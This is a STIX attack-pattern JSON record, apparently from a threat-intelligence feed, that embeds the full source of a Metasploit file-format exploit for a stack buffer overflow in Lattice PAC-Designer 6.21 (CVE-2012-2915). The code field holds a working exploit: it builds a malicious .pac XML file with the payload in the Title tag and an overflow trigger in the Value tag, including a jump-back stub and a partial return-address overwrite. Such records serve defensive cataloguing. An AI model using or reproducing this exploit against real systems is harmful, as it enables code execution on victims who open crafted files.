{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--598f5ecf-cf7a-437e-8779-fa4c6e3c6adf",
    "created": "2024-08-14T16:36:41.818327Z",
    "modified": "2024-08-14T16:36:41.818331Z",
    "name": "\"Lattice Semiconductor PAC-Designer 6.21 Symbol Value Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Lattice Semiconductor PAC-Designer 6.21.  As a .pac file, when supplying a long string of data to the 'value' field under the 'SymbolicSchematicData' tag, it is possible to cause a memory corruption on the stack, which results in arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/lattice_pac_bof.rb",
            "external_id": "lattice_pac_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2915"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120523175252/http://secunia.com:80/advisories/48741"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Lattice Semiconductor PAC-Designer 6.21 Symbol Value Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Lattice Semiconductor PAC-Designer\n        6.21.  As a .pac file, when supplying a long string of data to the 'value' field\n        under the 'SymbolicSchematicData' tag, it is possible to cause a memory corruption\n        on the stack, which results in arbitrary code execution under the context of the\n        user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',      #Discovery\n          'juan vazquez', #Metasploit\n          'sinn3r'        #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-2915'],\n          ['OSVDB', '82001'],\n          ['EDB', '19006'],\n          ['BID', '53566'],\n          ['URL', 'http://web.archive.org/web/20120523175252/http://secunia.com:80/advisories/48741']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x3c\\x3e\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'PAC-Designer 6.21 on Windows XP SP3',\n            {\n              # P/P/R in PACD621.exe\n              # ASLR: False, Rebase: False, SafeSEH: False, OS: False\n              'Ret' => 0x00805020\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The filename', 'msf.pac'])\n      ])\n  end\n\n  def exploit\n    # The payload is placed in the <title> field\n    p = payload.encoded\n\n    # The trigger is placed in the <value> field, which will jmp to our\n    # payload in the <title> field.\n    buf  = \"\\x5f\"    #POP EDI\n    buf << \"\\x5f\"    #POP EDI\n    buf << \"\\x5c\"    #POP ESP\n    buf << \"\\x61\"*6  #POPAD x 6\n    buf << \"\\x51\"    #PUSH ECX\n    buf << \"\\xc3\"    #RET\n    buf << rand_text_alpha(96-buf.length, payload_badchars)\n    buf << \"\\xeb\\x9e#{rand_text_alpha(2, payload_badchars)}\"  #Jmp back to the beginning of the buffer\n    buf << [target.ret].pack('V')[0,3] # Partial overwrite\n\n    xml = %Q|<?xml version=\"1.0\"?>\n<PacDesignData>\n  <DocFmtVersion>1</DocFmtVersion>\n  <DeviceType>ispPAC-CLK5410D</DeviceType>\n  <CreatedBy>PAC-Designer 6.21.1336</CreatedBy>\n  <SummaryInformation>\n    <Title>#{p}</Title>\n    <Author>#{Rex::Text.rand_text_alpha(6)}</Author>\n  </SummaryInformation>\n\n  <SymbolicSchematicData>\n    <Symbol>\n      <SymKey>153</SymKey>\n      <NameText>Profile 0 Ref Frequency</NameText>\n      <Value>#{buf}</Value>\n    </Symbol>\n  </SymbolicSchematicData>\n</PacDesignData>|\n\n    file_create(xml)\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-05-16",
    "x_mitre_platforms": [
        "win'"
    ]
}